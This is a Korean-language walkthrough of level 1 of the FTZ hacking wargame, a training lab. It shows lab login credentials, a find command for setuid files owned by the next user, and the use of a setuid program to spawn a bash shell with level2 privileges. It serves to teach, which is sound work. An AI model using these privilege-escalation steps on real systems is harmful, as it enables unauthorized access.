---
sort: 1
---

# Level 1

```note
id : level1

password : level1
```

```bash
[level1@ftz level1]$ cat hint

level2 권한에 setuid가 걸린 파일을 찾는다.
```

find 명령어를 통해 해당 파일을 찾을 수 있다. find 명령어에 대해 잘 모른다면 `man find`를 통해 살펴보자.

```bash
[level1@ftz level1]$ find / -user level2 -perm +4000 2> /dev/null
/bin/ExecuteMe
[level1@ftz level1]$ ls -al /bin/ExecuteMe
-rwsr-x---    1 level2   level1      12868  9월 10  2011 /bin/ExecuteMe
```

setuid가 걸려있기 때문에 ExecuteMe를 실행하면 level2의 권한을 얻게된다.<br>
my-pass는 안되기 때문에 level2권한의 shell을 얻기 위해서 bash를 실행한다.

```bash
		레벨2의 권한으로 당신이 원하는 명령어를
		한가지 실행시켜 드리겠습니다.
		(단, my-pass 와 chmod는 제외)

		어떤 명령을 실행시키겠습니까?


		[level2@ftz level2]$ bash


[level2@ftz level2]$ my-pass
```

```tip
## 알게 된 점

find를 통해 원하는 파일을 탐색할 수 있다.

shell은 명령어를 실행시켜줄 수 있는 프로그램이다.
```